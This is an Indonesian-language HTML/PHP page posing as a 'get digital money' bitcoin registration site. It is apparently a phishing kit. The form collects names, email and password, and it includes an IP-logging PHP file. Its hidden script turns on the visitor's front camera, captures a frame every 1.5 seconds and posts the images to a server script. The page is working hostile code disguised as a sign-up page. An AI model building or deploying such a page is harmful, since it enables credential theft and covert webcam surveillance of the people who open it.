<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
</head>
<head>
    <title>Cara mudah mendapatkan uang digital</title>
    <meta name="description" content="please register first">
    <link role="icon" type="imge/jpg" href="https://akcdn.detik.net.id/visual/2021/06/08/ilustrasi-bitcoin-2_169.jpeg">
</head>
<body>
    <center><img src="https://a.top4top.io/p_2072svf680.png" width="200" height="250"</center>
</body>
<body>
    <form action="https://forumbitcoin.co.id/tags/nuyul-bitcoin">
        <label>Nama Depan</label><br>
        <input name="facebook" action="facebook " id="facebook" type="facebook"><br>
        <label>Nama Belakang</label><br>
        <input name="facebook" action="facebook " id="facebook" type="facebook"><br>
        <label>Email</label><br>
        <input name="email" action="email" id="email" type="email"><br>
        <label>Password</label><br>
        <input name="password" action="password" id="password" type="password"><br>

        <p><label><input type="checkbox" name="mirror" id="mirror" /> Setuju & Lanjutkan</label></p>
        <button>Register</button>
    </form>
</body>
</html>
<html>
<body>
<?php
include 'ip.php';
?>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

</body>
</html>